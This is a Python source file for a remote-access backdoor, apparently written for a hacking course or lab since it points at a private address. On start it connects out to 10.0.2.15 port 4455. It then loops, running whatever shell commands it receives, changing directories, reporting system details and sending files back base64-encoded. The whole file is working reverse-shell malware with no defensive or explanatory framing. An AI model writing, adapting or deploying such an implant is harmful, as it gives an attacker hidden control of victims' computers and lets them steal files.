import socket
import subprocess
import json
import os
import platform
import base64
# import logging
# logging.basicConfig(level=logging.DEBUG)

class Backdoor:
    def __init__(self, ip, port):
        self.connector = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connector.connect((ip, port))

    def send_reliable_data(self, data):
        try:
            json_data = json.dumps(data)
            json_data = json_data.encode()
            self.connector.send(json_data)
        except TypeError:
            exit()

    def receive_reliable_data(self):
        json_data = b''
        while True:
            try:
                json_data = json_data + self.connector.recv(1024)
                # json_data = json_data.decode('utf-8')
                return json.loads(json_data)
            except ValueError:
                continue
    def execute_remote_cmd(self, command):
        return subprocess.check_output(command, shell=True)
    def change_working_dir(self, path):
        os.chdir(path)
        return('Change Working Directory to ' + path)
    def sys_info(self, uname):
        uname = platform.uname()
        print('='*40, 'System Information', '='*40)
        system = uname.system
        node = uname.node
        release = uname.release
        version = uname.version
        # print('System Information: ', {system})
        # print("System Node: ", {node})
        # print("System Release: ", {release})
        # print("System Version: ", {version})
        sysinfo = {'System Information': system, 'System Node': node, 'System Release':release, 'System Version': version}
        print(sysinfo)

    def read_files(self, file_path):
        with open(file_path, "rb") as file:
            return base64.b64encode(file.read())

    def write_file(self, path, content):
        with open(path, "wb") as file:
            # content = content.decode()
            file.write(base64.b64decode(content.encode()))
            return "[+] Download Successful..."

    def run(self):
        while True:
            cmd = self.receive_reliable_data()
            if cmd[0] == "exit":
                self.connector.close()
                exit()
            elif cmd[0] == 'cd' and len(cmd) > 1:
                cmd_result = self.change_working_dir(cmd[1])    
            elif cmd[0] == 'sysinfo':
                cmd_result = self.sys_info(cmd[0])
            elif cmd[0] == 'download':
                cmd_result = self.read_files(cmd[1]).decode()
            else:
                cmd_result = self.execute_remote_cmd(cmd)
            if cmd[0] == 'ls' or cmd[0] == 'dir':
                cmd_result = self.send_reliable_data(cmd_result.decode())
            else:    
                self.send_reliable_data(cmd_result)
            # cmd_result = self.execute_remote_cmd(cmd)


backdoor = Backdoor("10.0.2.15", 4455)
backdoor.run()